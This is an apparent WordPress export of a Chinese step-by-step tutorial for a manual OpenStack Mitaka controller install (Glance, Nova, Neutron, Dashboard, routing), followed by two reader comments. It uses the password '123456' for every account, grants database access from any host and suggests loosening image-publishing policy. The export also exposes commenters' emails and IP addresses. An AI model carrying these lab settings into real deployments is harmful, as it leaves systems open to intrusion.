<strong><span style="font-size: 12pt;">5.1、配置glance_api.conf</span></strong>
密码为 <code>123456</code>

<pre>openstack-config --set /etc/glance/glance-api.conf database connection mysql+pymysql://glance:123456@${HOSTNAME}/glance
openstack-config --set /etc/glance/glance-api.conf keystone_authtoken auth_uri http://${HOSTNAME}:5000
openstack-config --set /etc/glance/glance-api.conf keystone_authtoken auth_url http://${HOSTNAME}:35357
openstack-config --set /etc/glance/glance-api.conf keystone_authtoken memcached_servers ${HOSTNAME}:11211
openstack-config --set /etc/glance/glance-api.conf keystone_authtoken auth_type password
openstack-config --set /etc/glance/glance-api.conf keystone_authtoken project_domain_name default
openstack-config --set /etc/glance/glance-api.conf keystone_authtoken user_domain_name default
openstack-config --set /etc/glance/glance-api.conf keystone_authtoken username glance
openstack-config --set /etc/glance/glance-api.conf keystone_authtoken password 123456
openstack-config --set /etc/glance/glance-api.conf keystone_authtoken project_name service
openstack-config --set /etc/glance/glance-api.conf paste_deploy flavor keystone
openstack-config --set /etc/glance/glance-api.conf glance_store stores file,http
openstack-config --set /etc/glance/glance-api.conf glance_store default_store file
openstack-config --set /etc/glance/glance-api.conf glance_store filesystem_store_datadir /var/lib/glance/images/</pre>

<strong><span style="font-size: 12pt;">5.2、配置glance_registry.conf </span></strong>
密码为 <code>123456</code>

<pre>openstack-config --set /etc/glance/glance-registry.conf database connection mysql+pymysql://glance:123456@${HOSTNAME}/glance
openstack-config --set /etc/glance/glance-registry.conf keystone_authtoken auth_uri http://${HOSTNAME}:5000
openstack-config --set /etc/glance/glance-registry.conf keystone_authtoken auth_url http://${HOSTNAME}:35357
openstack-config --set /etc/glance/glance-registry.conf keystone_authtoken memcached_servers ${HOSTNAME}:11211
openstack-config --set /etc/glance/glance-registry.conf keystone_authtoken auth_type password
openstack-config --set /etc/glance/glance-registry.conf keystone_authtoken project_domain_name default
openstack-config --set /etc/glance/glance-registry.conf keystone_authtoken user_domain_name default
openstack-config --set /etc/glance/glance-registry.conf keystone_authtoken username glance
openstack-config --set /etc/glance/glance-registry.conf keystone_authtoken password 123456
openstack-config --set /etc/glance/glance-registry.conf keystone_authtoken project_name service
openstack-config --set /etc/glance/glance-registry.conf paste_deploy flavor keystone</pre>

<strong><span style="font-size: 14pt;">6、同步 glance 数据库</span></strong>

<pre>su -s /bin/sh -c "glance-manage db_sync" glance</pre>

<span style="font-size: 12pt;">以下信息不是报错：</span>

<pre>Option "verbose" from group "DEFAULT" is deprecated for removal. Its value may be silently ignored in the future.
/usr/lib/python2.7/site-packages/oslo_db/sqlalchemy/enginefacade.py:1056: OsloDBDeprecationWarning: EngineFacade is deprecated; please use oslo_db.sqlalchemy.enginefacade
 expire_on_commit=expire_on_commit, _conf=conf)</pre>

<span style="font-size: 14pt;"><strong>7、配置 glance 开机启动，启动 glance 并查看状态</strong></span>

<pre>systemctl enable openstack-glance-api.service openstack-glance-registry.service
systemctl restart openstack-glance-api.service openstack-glance-registry.service
systemctl status openstack-glance-api.service openstack-glance-registry.service</pre>

<strong>8、将 glance 版本号写入至环境变量文件中</strong>

<pre>echo "" &gt;&gt; /root/admin-openrc.sh &amp;&amp; echo "" &gt;&gt; /root/demo-openrc.sh \
&amp;&amp; echo "export OS_IMAGE_API_VERSION=2" | tee -a /root/admin-openrc.sh /root/demo-openrc.sh</pre>

<span style="font-size: 14pt;"><strong>9、下载测试镜像并上传镜像到 glance</strong></span>
<span style="font-size: 12pt;">下载镜像：</span>

<pre>wget http://download.cirros-cloud.net/0.3.4/cirros-0.3.4-x86_64-disk.img</pre>

<span style="font-size: 12pt;">上传镜像：</span>

<pre>glance image-create --name "cirros-0.3.4-x86_64" --file cirros-0.3.4-x86_64-disk.img \
--disk-format qcow2 --container-format bare --visibility public --progress</pre>

<span style="font-size: 12pt;">如果上传出现<strong>403</strong>，极有可能是上面的 5.1 、 5.2 配置敲错。</span><span style="font-size: 12pt;">如出现<strong>503</strong>错误，请用 <code>openstack user list</code> 等命令检查是否成功创建 glance 用户并赋予相应权限。</span>
<span style="font-size: 12pt;">查看镜像：</span>

<pre>glance image-list</pre>

&nbsp;
<!--nextpage-->

<h6><span style="font-size: 18pt;">0x07  安装 Nova</span></h6>

<strong><span style="font-size: 14pt;">1、创建 Nova 数据库，并创建数据库用户以及赋予权限</span></strong>

<pre>mysql -uroot -p123456 -e "CREATE DATABASE nova;"
mysql -uroot -p123456 -e "CREATE DATABASE nova_api;"
mysql -uroot -p123456 -e "GRANT ALL PRIVILEGES ON nova.* TO 'nova'@'localhost' IDENTIFIED BY '123456';"
mysql -uroot -p123456 -e "GRANT ALL PRIVILEGES ON nova.* TO 'nova'@'%' IDENTIFIED BY '123456';"
mysql -uroot -p123456 -e "GRANT ALL PRIVILEGES ON nova_api.* TO 'nova'@'localhost' IDENTIFIED BY '123456';"
mysql -uroot -p123456 -e "GRANT ALL PRIVILEGES ON nova_api.* TO 'nova'@'%' IDENTIFIED BY '123456';"</pre>

<strong><span style="font-size: 14pt;">2、创建 nova 用户以及赋予 admin 权限</span></strong>
<span style="font-size: 12pt;">先导入 admin-openrc.sh 环境变量脚本</span>

<pre>source /root/admin-openrc.sh
openstack user create --domain default nova --password 123456
openstack role add --project service --user nova admin</pre>

<strong><span style="font-size: 14pt;">3、创建 computer 服务</span></strong>

<pre>openstack service create --name nova --description "OpenStack Compute" compute</pre>

<strong><span style="font-size: 14pt;">4、创建 nova 的 endpoint</span></strong>

<pre>openstack endpoint create --region RegionOne compute public http://${HOSTNAME}:8774/v2.1/%\(tenant_id\)s
openstack endpoint create --region RegionOne compute internal http://${HOSTNAME}:8774/v2.1/%\(tenant_id\)s
openstack endpoint create --region RegionOne compute admin http://${HOSTNAME}:8774/v2.1/%\(tenant_id\)s</pre>

<strong><span style="font-size: 14pt;">5、安装 nova 等组件</span></strong>

<pre>yum install -y openstack-nova-api openstack-nova-cert openstack-nova-conductor openstack-nova-console \
openstack-nova-novncproxy openstack-nova-scheduler</pre>

<strong><span style="font-size: 14pt;">6、配置 Nova</span></strong>

<pre>openstack-config --set /etc/nova/nova.conf DEFAULT enabled_apis osapi_compute,metadata
openstack-config --set /etc/nova/nova.conf database connection mysql+pymysql://nova:123456@${HOSTNAME}/nova
openstack-config --set /etc/nova/nova.conf api_database connection mysql+pymysql://nova:123456@${HOSTNAME}/nova_api
openstack-config --set /etc/nova/nova.conf DEFAULT rpc_backend rabbit
openstack-config --set /etc/nova/nova.conf oslo_messaging_rabbit rabbit_host ${HOSTNAME}
openstack-config --set /etc/nova/nova.conf oslo_messaging_rabbit rabbit_userid openstack
openstack-config --set /etc/nova/nova.conf oslo_messaging_rabbit rabbit_password 123456
openstack-config --set /etc/nova/nova.conf DEFAULT auth_strategy keystone
openstack-config --set /etc/nova/nova.conf keystone_authtoken auth_uri http://${HOSTNAME}:5000
openstack-config --set /etc/nova/nova.conf keystone_authtoken auth_url http://${HOSTNAME}:35357
openstack-config --set /etc/nova/nova.conf keystone_authtoken memcached_servers ${HOSTNAME}:11211
openstack-config --set /etc/nova/nova.conf keystone_authtoken auth_type password
openstack-config --set /etc/nova/nova.conf keystone_authtoken project_domain_name default
openstack-config --set /etc/nova/nova.conf keystone_authtoken user_domain_name default
openstack-config --set /etc/nova/nova.conf keystone_authtoken project_name service
openstack-config --set /etc/nova/nova.conf keystone_authtoken username nova
openstack-config --set /etc/nova/nova.conf keystone_authtoken password 123456
openstack-config --set /etc/nova/nova.conf DEFAULT my_ip 192.168.188.128
openstack-config --set /etc/nova/nova.conf DEFAULT use_neutron True
openstack-config --set /etc/nova/nova.conf DEFAULT firewall_driver nova.virt.firewall.NoopFirewallDriver
openstack-config --set /etc/nova/nova.conf vnc vncserver_proxyclient_address 192.168.188.128
openstack-config --set /etc/nova/nova.conf glance api_servers http://${HOSTNAME}:9292
openstack-config --set /etc/nova/nova.conf oslo_concurrency lock_path /var/lib/nova/tmp
openstack-config --set /etc/nova/nova.conf vnc vncserver_list 192.168.188.128
openstack-config --set /etc/nova/nova.conf vnc enable True
openstack-config --set /etc/nova/nova.conf vnc novncproxy_base_url http://192.168.188.128:6080/vnc_auto.html</pre>

<strong><span style="font-size: 14pt;">7、同步 Nova 数据库</span></strong>

<pre>su -s /bin/sh -c "nova-manage api_db sync" nova
su -s /bin/sh -c "nova-manage db sync" nova</pre>

<span style="font-size: 12pt;">返回以下信息属正常：</span>

<pre>/usr/lib/python2.7/site-packages/pymysql/cursors.py:146:
Warning: Duplicate index 'block_device_mapping_instance_uuid_virtual_name_device_name_idx'
defined on the table 'nova.block_device_mapping'. This is deprecated and will be disallowed in a future release.
 result = self._query(query)
/usr/lib/python2.7/site-packages/pymysql/cursors.py:146:
Warning: Duplicate index 'uniq_instances0uuid' defined on the table 'nova.instances'.
This is deprecated and will be disallowed in a future release.
 result = self._query(query)</pre>

<strong><span style="font-size: 14pt;">8、配置 Nova 开机启动、启动 Nova 并查看状态</span></strong>

<pre>systemctl enable openstack-nova-api.service openstack-nova-cert.service \
openstack-nova-consoleauth.service openstack-nova-scheduler.service openstack-nova-conductor.service openstack-nova-novncproxy.service
systemctl restart openstack-nova-api.service openstack-nova-cert.service \
openstack-nova-consoleauth.service openstack-nova-scheduler.service openstack-nova-conductor.service openstack-nova-novncproxy.service
systemctl status openstack-nova-api.service openstack-nova-cert.service \
openstack-nova-consoleauth.service openstack-nova-scheduler.service openstack-nova-conductor.service openstack-nova-novncproxy.service</pre>

<strong><span style="font-size: 14pt;">9、安装 openstack-nova-compute 计算服务和追加 Nova 配置文件，并设置开机启动、启动服务以及查看状态</span></strong>

<pre>yum install -y openstack-nova-compute</pre>

<span style="font-size: 12pt;">追加配置文件：</span>
<span style="font-size: 10pt;">虚拟机环境：</span>

<pre>openstack-config --set /etc/nova/nova.conf libvirt virt_type qemu</pre>

<span style="font-size: 10pt;">实体机环境：
</span>

<pre>openstack-config --set /etc/nova/nova.conf libvirt virt_type KVM</pre>

<span style="font-size: 12pt;">设置开机启动、启动服务以及查看状态：
</span>

<pre>systemctl enable libvirtd.service openstack-nova-compute.service
systemctl start libvirtd.service openstack-nova-compute.service
systemctl status libvirtd.service openstack-nova-compute.service</pre>

<strong><span style="font-size: 14pt;">10、验证 Nova 服务</span></strong>

<pre>nova service-list
nova endpoints</pre>

<!--nextpage-->

<h6><span style="font-size: 18pt;">0x08  安装 Neutron</span></h6>

<strong><span style="font-size: 14pt;">1、创建 neutron 数据库，并创建数据库用户以及赋予权限</span></strong>

<pre>mysql -uroot -p123456 -e "CREATE DATABASE neutron;"
mysql -uroot -p123456 -e "GRANT ALL PRIVILEGES ON neutron.* TO 'neutron'@'localhost' IDENTIFIED BY '123456';"
mysql -uroot -p123456 -e "GRANT ALL PRIVILEGES ON neutron.* TO 'neutron'@'%' IDENTIFIED BY '123456';"</pre>

<strong><span style="font-size: 14pt;">2、创建 neutron 用户以及赋予 admin 权限</span></strong>

<pre>openstack user create --domain default neutron --password 123456
openstack role add --project service --user neutron admin</pre>

<strong><span style="font-size: 14pt;">3、创建 neutron 服务并创建 endpoint</span></strong>

<pre>openstack service create --name neutron --description "OpenStack Networking" network</pre>

<span style="font-size: 12pt;">创建 endpoint：</span>

<pre>openstack endpoint create --region RegionOne network public http://${HOSTNAME}:9696
openstack endpoint create --region RegionOne network internal http://${HOSTNAME}:9696
openstack endpoint create --region RegionOne network admin http://${HOSTNAME}:9696</pre>

<strong><span style="font-size: 14pt;">4、安装 neutron 等组件</span></strong>

<pre>yum install -y openstack-neutron openstack-neutron-ml2 openstack-neutron-linuxbridge ebtables</pre>

<strong><span style="font-size: 14pt;">5、配置 /etc/neutron/neutron.conf 文件</span></strong>

<pre>openstack-config --set /etc/neutron/neutron.conf database connection mysql+pymysql://neutron:123456@${HOSTNAME}/neutron
openstack-config --set /etc/neutron/neutron.conf DEFAULT core_plugin ml2
openstack-config --set /etc/neutron/neutron.conf DEFAULT service_plugins router
openstack-config --set /etc/neutron/neutron.conf DEFAULT allow_overlapping_ips True
openstack-config --set /etc/neutron/neutron.conf DEFAULT rpc_backend rabbit
openstack-config --set /etc/neutron/neutron.conf oslo_messaging_rabbit rabbit_host ${HOSTNAME}
openstack-config --set /etc/neutron/neutron.conf oslo_messaging_rabbit rabbit_userid openstack
openstack-config --set /etc/neutron/neutron.conf oslo_messaging_rabbit rabbit_password 123456
openstack-config --set /etc/neutron/neutron.conf DEFAULT auth_strategy keystone
openstack-config --set /etc/neutron/neutron.conf keystone_authtoken auth_uri http://${HOSTNAME}:5000
openstack-config --set /etc/neutron/neutron.conf keystone_authtoken auth_url http://${HOSTNAME}:35357
openstack-config --set /etc/neutron/neutron.conf keystone_authtoken memcached_servers ${HOSTNAME}:11211
openstack-config --set /etc/neutron/neutron.conf keystone_authtoken auth_type password
openstack-config --set /etc/neutron/neutron.conf keystone_authtoken project_domain_name default
openstack-config --set /etc/neutron/neutron.conf keystone_authtoken user_domain_name default
openstack-config --set /etc/neutron/neutron.conf keystone_authtoken project_name service
openstack-config --set /etc/neutron/neutron.conf keystone_authtoken username neutron
openstack-config --set /etc/neutron/neutron.conf keystone_authtoken password 123456
openstack-config --set /etc/neutron/neutron.conf DEFAULT notify_nova_on_port_status_changes True
openstack-config --set /etc/neutron/neutron.conf DEFAULT notify_nova_on_port_data_changes True
openstack-config --set /etc/neutron/neutron.conf nova auth_url http://${HOSTNAME}:35357
openstack-config --set /etc/neutron/neutron.conf nova auth_type password
openstack-config --set /etc/neutron/neutron.conf nova project_domain_name default
openstack-config --set /etc/neutron/neutron.conf nova user_domain_name default
openstack-config --set /etc/neutron/neutron.conf nova region_name RegionOne
openstack-config --set /etc/neutron/neutron.conf nova project_name service
openstack-config --set /etc/neutron/neutron.conf nova username nova
openstack-config --set /etc/neutron/neutron.conf nova password 123456
openstack-config --set /etc/neutron/neutron.conf oslo_concurrency lock_path /var/lib/neutron/tmp</pre>

<strong><span style="font-size: 14pt;">6、配置 /etc/neutron/plugins/ml2/ml2_conf.ini 文件</span></strong>

<pre>openstack-config --set /etc/neutron/plugins/ml2/ml2_conf.ini ml2 type_drivers flat,vlan,vxlan
openstack-config --set /etc/neutron/plugins/ml2/ml2_conf.ini ml2 mechanism_drivers linuxbridge,l2population
openstack-config --set /etc/neutron/plugins/ml2/ml2_conf.ini ml2 extension_drivers port_security
openstack-config --set /etc/neutron/plugins/ml2/ml2_conf.ini ml2 tenant_network_types vxlan
openstack-config --set /etc/neutron/plugins/ml2/ml2_conf.ini ml2_type_flat flat_networks provider
openstack-config --set /etc/neutron/plugins/ml2/ml2_conf.ini ml2_type_vxlan vni_ranges 1:1000
openstack-config --set /etc/neutron/plugins/ml2/ml2_conf.ini securitygroup enable_ipset True</pre>

<strong><span style="font-size: 14pt;">7、配置 /etc/neutron/plugins/ml2/linuxbridge_agent.ini 文件</span></strong>

<pre>openstack-config --set /etc/neutron/plugins/ml2/linuxbridge_agent.ini linux_bridge physical_interface_mappings provider:eno16777736
openstack-config --set /etc/neutron/plugins/ml2/linuxbridge_agent.ini vxlan enable_vxlan True
openstack-config --set /etc/neutron/plugins/ml2/linuxbridge_agent.ini vxlan local_ip 192.168.188.128
openstack-config --set /etc/neutron/plugins/ml2/linuxbridge_agent.ini vxlan l2_population True
openstack-config --set /etc/neutron/plugins/ml2/linuxbridge_agent.ini agent prevent_arp_spoofing True
openstack-config --set /etc/neutron/plugins/ml2/linuxbridge_agent.ini securitygroup enable_security_group True
openstack-config --set /etc/neutron/plugins/ml2/linuxbridge_agent.ini securitygroup firewall_driver neutron.agent.linux.iptables_firewall.IptablesFirewallDriver</pre>

<strong><span style="font-size: 14pt;">8、配置 /etc/neutron/l3_agent.ini 文件</span></strong>

<pre>openstack-config --set /etc/neutron/l3_agent.ini DEFAULT interface_driver neutron.agent.linux.interface.BridgeInterfaceDriver
openstack-config --set /etc/neutron/l3_agent.ini DEFAULT external_network_bridge</pre>

<strong><span style="font-size: 14pt;">9、配置 /etc/neutron/dhcp_agent.ini 文件</span></strong>

<pre>openstack-config --set /etc/neutron/dhcp_agent.ini DEFAULT interface_driver neutron.agent.linux.interface.BridgeInterfaceDriver
openstack-config --set /etc/neutron/dhcp_agent.ini DEFAULT dhcp_driver neutron.agent.linux.dhcp.Dnsmasq
openstack-config --set /etc/neutron/dhcp_agent.ini DEFAULT enable_isolated_metadata True
openstack-config --set /etc/neutron/dhcp_agent.ini DEFAULT verbose True</pre>

<strong>10、<span style="font-size: 14pt;">配置 /etc/neutron/metadata_agent.ini 文件</span></strong>

<pre>openstack-config --set /etc/neutron/metadata_agent.ini DEFAULT nova_metadata_ip ${HOSTNAME}
openstack-config --set /etc/neutron/metadata_agent.ini DEFAULT metadata_proxy_shared_secret 123456
openstack-config --set /etc/neutron/metadata_agent.ini DEFAULT verbose True</pre>

<strong><span style="font-size: 14pt;">11、追加配置 Nova，配置/etc/nova/nova.conf 文件</span></strong>

<pre>openstack-config --set /etc/nova/nova.conf neutron url http://${HOSTNAME}:9696
openstack-config --set /etc/nova/nova.conf neutron auth_url http://${HOSTNAME}:35357
openstack-config --set /etc/nova/nova.conf neutron auth_plugin password
openstack-config --set /etc/nova/nova.conf neutron project_domain_id default
openstack-config --set /etc/nova/nova.conf neutron user_domain_id default
openstack-config --set /etc/nova/nova.conf neutron region_name RegionOne
openstack-config --set /etc/nova/nova.conf neutron project_name service
openstack-config --set /etc/nova/nova.conf neutron username neutron
openstack-config --set /etc/nova/nova.conf neutron password 123456
openstack-config --set /etc/nova/nova.conf neutron service_metadata_proxy True
openstack-config --set /etc/nova/nova.conf neutron metadata_proxy_shared_secret 123456</pre>

<strong><span style="font-size: 14pt;">12、重启 Nova 服务</span></strong>
<span style="font-size: 12pt;">上面修改完 Nova 配置，所以需要重启一次。</span>

<pre>systemctl restart openstack-nova-api.service
systemctl status openstack-nova-api.service</pre>

<span style="font-size: 14pt;"><strong>13、配置 /etc/neutron/dnsmasq-neutron.conf
</strong></span>
<span style="font-size: 12pt;">新建文件：</span>

<pre>vim /etc/neutron/dnsmasq-neutron.conf</pre>

<span style="font-size: 12pt;">写入：</span>

<pre>dhcp-option-force=26,1450</pre>

<strong><span style="font-size: 14pt;">14、创建配置文件软连接</span></strong>

<pre>ln -s /etc/neutron/plugins/ml2/ml2_conf.ini /etc/neutron/plugin.ini</pre>

<strong><span style="font-size: 14pt;">15、同步 Neutron 数据库</span></strong>

<pre>su -s /bin/sh -c "neutron-db-manage --config-file /etc/neutron/neutron.conf --config-file /etc/neutron/plugins/ml2/ml2_conf.ini upgrade head" neutron</pre>

<span style="font-size: 12pt;">同步的时候发现了 <code>No handlers could be found for logger "oslo_config.cfg"</code> 这个提示，目前尚未解决。</span>
<strong><span style="font-size: 14pt;">16、配置 Neutron 服务开机启动、启动 Neutron 服务并查看状态</span></strong>

<pre>systemctl enable neutron-server.service neutron-linuxbridge-agent.service neutron-dhcp-agent.service neutron-metadata-agent.service neutron-l3-agent.service
systemctl restart neutron-server.service neutron-linuxbridge-agent.service neutron-dhcp-agent.service neutron-metadata-agent.service neutron-l3-agent.service
systemctl status neutron-server.service neutron-linuxbridge-agent.service neutron-dhcp-agent.service neutron-metadata-agent.service neutron-l3-agent.service</pre>

<strong><span style="font-size: 14pt;">17、验证 Neutron 服务</span></strong>

<pre>neutron ext-list
neutron agent-list</pre>

<strong><span style="font-size: 14pt;">18、设置安全组规则</span></strong>

<pre>openstack security group rule create --proto icmp default
openstack security group rule create --proto tcp --dst-port 22 default</pre>

<span style="font-size: 12pt;">开放 icmp 协议，让实例允许被 ping 通。开放 22 端口，允许使用 ssh 连接实例。</span>
<strong><span style="font-size: 14pt;">19、重启服务</span></strong>

<pre>systemctl restart neutron-dhcp-agent neutron-l3-agent neutron-linuxbridge-agent neutron-metadata-agent neutron-server \
libvirtd.service openstack-nova-compute.service
systemctl status neutron-dhcp-agent neutron-l3-agent neutron-linuxbridge-agent neutron-metadata-agent neutron-server \
libvirtd.service openstack-nova-compute.service</pre>

<strong><span style="font-size: 14pt;">20、创建 flat 模式网络</span></strong>
<strong><span style="font-size: 12pt;">20.1 创建 flat 模式的 public 网络：</span></strong>
<span style="font-size: 12pt;">创建一个 public 的 flat 网络，用于连接外网。</span>

<pre>neutron --debug net-create --shared provider --router:external True --provider:network_type flat --provider:physical_network provider</pre>

<strong><span style="font-size: 12pt;">20.2 创建  public 网络子网：</span></strong>
网段为 <code>192.168.188/24</code> ，浮动范围 <code>192.168.188.20~192.168.188.80</code> ，供实例使用。dns 设置为 <code>114.114.114.114</code>，网关为虚拟机的 <code>192.168.188.2</code> 。

<pre>neutron subnet-create provider 192.168.188.0/24 --name provider-sub --allocation-pool \
start=192.168.188.20,end=192.168.188.80 --dns-nameserver 114.114.114.114 --gateway 192.168.188.2</pre>

<strong><span style="font-size: 14pt;">21、创建 vxLan 模式网络</span></strong>
<strong><span style="font-size: 12pt;">21.1 创建 vxLan 模式的 private 网络：</span></strong>
<span style="font-size: 12pt;">该网络不连接外网，用于实例网络连接、管理。</span>

<pre>neutron net-create private --provider:network_type vxlan --router:external False --shared</pre>

<strong><span style="font-size: 12pt;">21.2 创建 private 网络子网：</span></strong>

<pre>neutron subnet-create private --name internal-subnet --gateway 10.0.0.1 10.0.0.0/24</pre>

<strong><span style="font-size: 14pt;">22、路由配置留到安装完 Dashboard 后配置</span></strong>
<!--nextpage-->

<h6><span style="font-size: 18pt;">0x09  安装 Dashboard</span></h6>

<strong><span style="font-size: 14pt;">1、安装 Dashboard 组件</span></strong>

<pre>yum install -y openstack-dashboard</pre>

<strong><span style="font-size: 14pt;">2、修改配置文件</span></strong>

<pre>vim /etc/openstack-dashboard/local_settings</pre>

<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/WY@UGXT2UFO5YXTHA3.jpg"><img class="alignnone size-full wp-image-1498" src="https://www.nervgeek.com/wp-content/uploads/2016/09/WY@UGXT2UFO5YXTHA3.jpg" alt="wyugxt2ufo5yxtha3" width="67" height="69" /></a> <span style="font-size: 12pt;">这配置文件超容易弄错的，我提供配置文件给大家，自个对照以下吧。查看地址 <a href="https://www.nervgeek.com/wp-content/uploads/2016/09/local_settings.txt">local_settings</a> 。</span>
<strong><span style="font-size: 14pt;">3、配置 Dashboard 开机启动、启动 Dashboard 服务并查看状态</span></strong>

<pre>systemctl enable httpd.service memcached.service
systemctl restart httpd.service memcached.service
systemctl status httpd.service memcached.service</pre>

<strong><span style="font-size: 14pt;">4、浏览器登录 Dashboard</span></strong>
<span style="font-size: 12pt;">在浏览器输入 192.168.188.127/dashboard：</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/0QIIBJ7_WT@VDPNXBO1.png"><img class="wp-image-1500 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/0QIIBJ7_WT@VDPNXBO1.png" alt="0qiibj7_wtvdpnxbo1" width="708" height="382" /></a>
<span style="font-size: 12pt;">域为我们创建的 <code>default</code> ，用户为 <code>admin</code> ，密码就是我们设置的密码 <code>123456</code> 。</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/7WX_LQMS1RU6CNVOA@2.png"><img class="wp-image-1501 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/7WX_LQMS1RU6CNVOA@2.png" alt="7wx_lqms1ru6cnvoa2" width="714" height="383" /></a>
<span style="font-size: 12pt;">不知道是不是我内存分配太少的原因...页面打开超慢的...假如大家机器允许可以给予更高的配置。</span>

<h6><span style="font-size: 18pt;">0x10  路由配置</span></h6>

<strong><span style="font-size: 14pt;">1、创建路由</span></strong>
<strong><span style="font-size: 14pt;"><a href="https://www.nervgeek.com/wp-content/uploads/2016/09/SRH3CFETSQM52VFPW_ND.png"><img class="wp-image-1502 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/SRH3CFETSQM52VFPW_ND.png" alt="srh3cfetsqm52vfpw_nd" width="662" height="354" /></a></span></strong>

<p style="text-align: center;"><code><span style="font-size: 12pt;">新建路由位置。</span></code></p>

<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/PGJ2CT7H7S2XSCEE.png"><img class=" wp-image-1503 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/PGJ2CT7H7S2XSCEE.png" alt="pgj2ct7h7s2xscee" width="671" height="339" /></a>

<p style="text-align: center;"><code>信息填写。</code></p>

<strong><span style="font-size: 14pt;">2、路由接口配置</span></strong>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/L0LK3SNRX2US8Y57XI.png"><img class="wp-image-1504 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/L0LK3SNRX2US8Y57XI.png" alt="l0lk3snrx2us8y57xi" width="771" height="200" /></a>

<p style="text-align: center;"><code><span style="font-size: 12pt;">点击 "名称" 进入配置界面。</span></code></p>

<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/G55T4SIBAU8B8L6YY.png"><img class="wp-image-1505 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/G55T4SIBAU8B8L6YY.png" alt="g55t4sibau8b8l6yy" width="763" height="409" /></a>

<p style="text-align: center;"><code>增加接口位置。</code></p>

<p style="text-align: center;"><a href="https://www.nervgeek.com/wp-content/uploads/2016/09/Z5ZTMGWCYOR4BVDMU4.png"><img class="alignnone size-full wp-image-1506" src="https://www.nervgeek.com/wp-content/uploads/2016/09/Z5ZTMGWCYOR4BVDMU4.png" alt="z5ztmgwcyor4bvdmu4" width="732" height="440" /></a></p>

<p style="text-align: center;"><code>提交配置。刷新页面后可发现两个接口状态皆为 "运行中" 。</code></p>

<p style="text-align: left;"></p>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1451</wp:post_id>
		<wp:post_date><![CDATA[2016-09-07 17:55:23]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-09-07 09:55:23]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[openstack-mitaka%e6%89%8b%e5%8a%a8%e5%ae%89%e8%a3%85-controller%e8%8a%82%e7%82%b9]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="%e4%ba%91%e8%ae%a1%e7%ae%97"><![CDATA[云计算]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[2229]]></wp:meta_value>
		</wp:postmeta>
							<wp:comment>
			<wp:comment_id>33</wp:comment_id>
			<wp:comment_author><![CDATA[Mr9esx]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[1138099359@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[113.104.33.150]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2016-09-07 20:17:46]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2016-09-07 12:17:46]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[遇到两个问题：
1、上传镜像时报403错误，修改/etc/glance/policy.json的publicize_image为"publicize_image": ""才可以上传，但以前并没有报过这个错。尚未解决。
2、openstack-keystone.service一直启动失败，但5000和35357都已占用，后发现是httpd占用的端口，虽然keystone无法启动但可以正常使用keystone功能。尚未解决。]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>34</wp:comment_id>
			<wp:comment_author><![CDATA[logistics]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[280552103@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[118.250.42.241]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2016-09-07 21:25:42]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2016-09-07 13:25:42]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[1.自从juno版本，一般来说不允许user角色的用户创建public镜像（只允许admin角色的用户创建）。但是可以修改policy.json文件，开启老版本的允许user角色的用户创建public镜像功能.
"publicize_image": "role:admin",         ==&gt;           "publicize_image": "",
2. 在官方文档中并没有开启keystone-all服务，而是apache，也就是说通过apache来监听5000和35357，然后传递给keystone，因此只需要启动apache就好了，启动了keystone-all 也占用了5000和35357。所以只要启动httpd （apache）即可。]]></wp:comment_content>
